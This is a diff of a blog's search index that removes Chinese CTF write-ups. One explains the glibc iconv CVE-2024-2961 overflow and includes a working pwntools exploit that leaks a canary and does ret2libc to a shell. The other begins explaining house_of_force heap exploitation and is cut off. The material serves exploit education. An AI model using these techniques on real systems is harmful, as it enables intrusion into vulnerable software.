@@ -1,136 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CVE-2024-2961</title>
-    <url>/blog/2024/09/21/CVE-2024-2961/</url>
-    <content><![CDATA[<h2 id="iconv-cve-2024-2961"><a href="#iconv-cve-2024-2961" class="headerlink" title="iconv-cve-2024-2961"></a>iconv-cve-2024-2961</h2><h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
-<h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 |		溢出内容		|		原UTF-8表示</span><br><span class="line">劄  		$*H [24 2A 48]      	  \xe5\x8a\x84</span><br><span class="line">䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a</span><br><span class="line">峛  		$*H [24 2A 48]			  \xe5\xb3\x9b</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h4><p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc&#x2F;iconvdata&#x2F;iso-2022-cn-ext.c中查看</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ESC	0x1b</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line">...........................................................</span><br><span class="line"><span class="comment">/* See whether we have to emit an escape sequence.  */</span>		      </span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">set</span> != used)						      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    <span class="comment">/* First see whether we announced that we use this		      </span></span><br><span class="line"><span class="comment">	       character set.  */</span>					      </span><br><span class="line">	    <span class="keyword">if</span> ((used &amp; SO_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; <span class="number">8</span>))	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">									      </span><br><span class="line">		assert (used &gt;= <span class="number">1</span> &amp;&amp; used &lt;= <span class="number">4</span>);			      </span><br><span class="line">		escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;			      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SO_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS2_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert (used == CNS11643_2_set); <span class="comment">/* XXX */</span>		      </span><br><span class="line">		escseq = <span class="string">&quot;*H&quot;</span>;						      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS3_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert ((used &gt;&gt; <span class="number">5</span>) &gt;= <span class="number">3</span> &amp;&amp; (used &gt;&gt; <span class="number">5</span>) &lt;= <span class="number">7</span>);		      </span><br><span class="line">		escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;		      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="keyword">if</span> (used == CNS11643_2_set)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS2_0;					      </span><br><span class="line">		*outptr++ = SS2_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS3_0;					      </span><br><span class="line">		*outptr++ = SS3_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span>							      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="comment">/* We only have to emit something if currently ASCII is	      </span></span><br><span class="line"><span class="comment">		   selected.  Otherwise we are switching within the	      </span></span><br><span class="line"><span class="comment">		   SO charset.  */</span>					      </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">set</span> == ASCII_set)					      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    <span class="keyword">if</span> (outptr + <span class="number">1</span> &gt; outend)				      </span><br><span class="line">		      &#123;							      </span><br><span class="line">			result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">			<span class="keyword">break</span>;						      </span><br><span class="line">		      &#125;							      </span><br><span class="line">		    *outptr++ = SO;					      </span><br><span class="line">		  &#125;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="comment">/* Always test the length here since we have used up all the      </span></span><br><span class="line"><span class="comment">	       guaranteed output buffer slots.  */</span>			      </span><br><span class="line">	    <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">		<span class="keyword">break</span>;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	  &#125;								      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">	    <span class="keyword">break</span>;							      </span><br><span class="line">	  &#125;								      </span><br><span class="line">									      </span><br><span class="line">	*outptr++ = buf[<span class="number">0</span>];						      </span><br><span class="line">	*outptr++ = buf[<span class="number">1</span>];						      </span><br><span class="line">	<span class="built_in">set</span> = used;							      </span><br><span class="line">      &#125;									      </span><br><span class="line">									      </span><br><span class="line">    <span class="comment">/* Now that we wrote the output increment the input pointer.  */</span>	      </span><br><span class="line">    inptr += <span class="number">4</span>;								      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
-<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
-<p><strong>set</strong>是当前的字符集标识</p>
-<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
-<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
-<p><strong>outend</strong> 是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
-<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
-<h5 id="三种不同的字符集"><a href="#三种不同的字符集" class="headerlink" title="三种不同的字符集"></a>三种不同的字符集</h5><p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single Shift 3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
-<h6 id="SO-Shift-Out"><a href="#SO-Shift-Out" class="headerlink" title="SO (Shift Out)"></a>SO (Shift Out)</h6><ul>
-<li><strong>用途</strong>: SO（Shift Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
-<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
-<li><strong>作用</strong>: 在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
-</ul>
-<h6 id="SS2-Single-Shift-2"><a href="#SS2-Single-Shift-2" class="headerlink" title="SS2 (Single Shift 2)"></a>SS2 (Single Shift 2)</h6><ul>
-<li><strong>用途</strong>: SS2（Single Shift 2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
-<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
-<li><strong>作用</strong>: 在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
-</ul>
-<h6 id="SS3-Single-Shift-3"><a href="#SS3-Single-Shift-3" class="headerlink" title="SS3 (Single Shift 3)"></a>SS3 (Single Shift 3)</h6><ul>
-<li><strong>用途</strong>: SS3（Single Shift 3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
-<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
-<li><strong>作用</strong>: 类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
-</ul>
-<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    	ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h5 id="实际运行中的-used-及其对应分支"><a href="#实际运行中的-used-及其对应分支" class="headerlink" title="实际运行中的 used 及其对应分支"></a>实际运行中的 used 及其对应分支</h5><p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
-<p>具体哪一个 <code>used</code> 的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
-<ul>
-<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为 <code>GB2312_set</code>（值为1）。</li>
-<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_2_set</code>（值为24）。</li>
-<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_3_set</code>（值为96）。</li>
-</ul>
-<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为 <code>GB2312_set</code>（1），并进入第一个 <code>if</code> 分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code> 将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
-<h5 id="具体执行过程"><a href="#具体执行过程" class="headerlink" title="具体执行过程"></a>具体执行过程</h5><p><strong>1. 检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
-<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
-<p>我们现在详细分析下3个if分支的条件</p>
-<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code>	</p>
-<ul>
-<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p>
-</li>
-<li><p>(ann &amp; SO_ann) !&#x3D; (used &lt;&lt; 8)用于检测是否声明过该字符集</p>
-</li>
-<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p>
-</li>
-</ul>
-<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
-<ul>
-<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
-</ul>
-<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
-<ul>
-<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
-</ul>
-<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">&#123;							      </span><br><span class="line">	result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">	<span class="keyword">break</span>;						     </span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
-<p><strong>3.生成转义序列</strong>：</p>
-<ul>
-<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
-<li>更新已声明的字符集<code>ann</code>。</li>
-</ul>
-<p><code>escseq</code> 是一个指向字符数组的指针，用于存储转义序列（escape sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *escseq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SO 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS2 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;*H&quot;</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS3 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
-<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
-<ul>
-<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
-<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC与0x4f的后缀。</li>
-</ul>
-<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr + 1 &lt;&#x3D; outend</strong>，则加入0x0e后缀。</p>
-<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
-<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
-<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
-<h4 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h4><h5 id="XGCTF-echo"><a href="#XGCTF-echo" class="headerlink" title="XGCTF [echo]"></a>XGCTF [echo]</h5><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185742098.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185755294.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185806653.png"
-                      class=""
-                >
-
-<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的\x00给覆盖了，那么printf(“%s”,s)就能直接把canary的值打印出来了。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185814773.png"
-                      class=""
-                >
-
-<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./echo&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28257</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x25</span> + <span class="string">&quot;劄&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x48&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret = <span class="number">0x401493</span></span><br><span class="line">ret_add = <span class="number">0x40101a</span></span><br><span class="line">main_add = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_add)) </span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_add = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_add = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;collectcrop&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Exploits under exception handling</title>
     <url>/blog/2024/09/21/Exploits-under-exception-handling/</url>
     <content><![CDATA[<h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>在栈溢出漏洞中，程序没有控制或错误控制输入的大小导致了该漏洞的产生。那我们很自然会想到能不能用<code>try</code>  <code>throw</code> <code>catch</code>的异常机制来捕获栈溢出行为，从而能更直观的获取错误信息，也在一定程度上避免了一些奇怪的错误产生。但在c++的异常处理实现中，如果我们放任输入数据超过缓冲区大小，冀以异常机制来捕获栈溢出，结果将不尽如人意，甚至还会导致canary保护机制的绕过。</p>
@@ -526,129 +396,6 @@
       </tags>
   </entry>
   <entry>
-    <title>house_of_force</title>
-    <url>/blog/2024/10/03/house-of-force/</url>
-    <content><![CDATA[<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
-<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
-<li>能控制top chunk的size域</li>
-<li>能获取heap_base，进而计算出top_chunk的地址</li>
-<li>能自由控制堆分配尺寸大小</li>
-</ul>
-<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
-<li><p>将top chunk的size改得很大，使后续能够分配很大的堆块，从而使topchunk指向目标地址。</p>
-</li>
-<li><p>精准计算top chunk的地址与target addr-0x10之间偏移，再进行细微的调整，使申请完一个chunk后，top chunk的data域直接位于target addr处。</p>
-</li>
-<li><p>再申请一个chunk，往目标地址处写入值。</p>
-</li>
-</ul>
-<h4 id="实现目的"><a href="#实现目的" class="headerlink" title="实现目的"></a>实现目的</h4><p>任意地址写</p>
-<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>2.27glibc top chunk分配源代码如下</p>
-<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = <span class="built_in">chunksize</span> (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  remainder_size = size - nb;			<span class="comment">//分配后剩下的大小</span></span><br><span class="line">  remainder = <span class="built_in">chunk_at_offset</span> (victim, nb);		<span class="comment">//剩下的chunk</span></span><br><span class="line">  av-&gt;top = remainder;							<span class="comment">//更新top chunk</span></span><br><span class="line">  <span class="built_in">set_head</span> (victim, nb | PREV_INUSE |			<span class="comment">//设置从原topchunk分配出的chunk的头部</span></span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  <span class="built_in">set_head</span> (remainder, remainder_size | PREV_INUSE);	<span class="comment">//设置新的top chunk的头部</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_malloced_chunk</span> (av, victim, nb);</span><br><span class="line">  <span class="type">void</span> *p = <span class="built_in">chunk2mem</span> (victim);</span><br><span class="line">  <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>其中nb定义在<code>checked_request2size (bytes, nb);</code>,这个宏内部定义了nb的值（也就是sz）。<code>_int_malloc (mstate av, size_t bytes)</code>，bytes是该函数的参数，也就是我们调用malloc函数时传进去的数字。<code>nb</code> 实质上是用来存储经过调整后的内存请求大小的变量。</p>
-<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=						      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span 